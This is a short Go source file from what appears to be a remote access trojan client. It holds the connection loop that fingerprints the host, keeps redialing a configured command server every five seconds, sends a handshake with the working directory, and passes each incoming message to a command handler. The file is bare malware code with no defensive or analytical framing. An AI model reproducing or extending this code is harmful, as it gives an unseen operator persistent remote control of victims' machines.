package connection

import (
	"net"
	"time"

	"client-go/config"
	"client-go/executor"
	"client-go/handler"
	"client-go/protocol"
)

type Client struct {
	clientID string
	identity hostIdentity
}

func New() *Client {
	return &Client{clientID: executor.NewClientID(), identity: detectHostIdentity()}
}

func (c *Client) Run() {
	for {
		conn, err := net.Dial("tcp", config.SERVER_ADDR)
		if err != nil {
			time.Sleep(5 * time.Second)
			continue
		}

		sock := protocol.NewRATSocket(conn)
		session := executor.NewSession(sock, c.clientID)

		_ = sock.Send(c.buildHandshake(session.Cwd))

		for {
			msg, err := sock.Recv()
			if err != nil {
				_ = conn.Close()
				break
			}

			handler.Handle(session, msg)
		}
	}
}
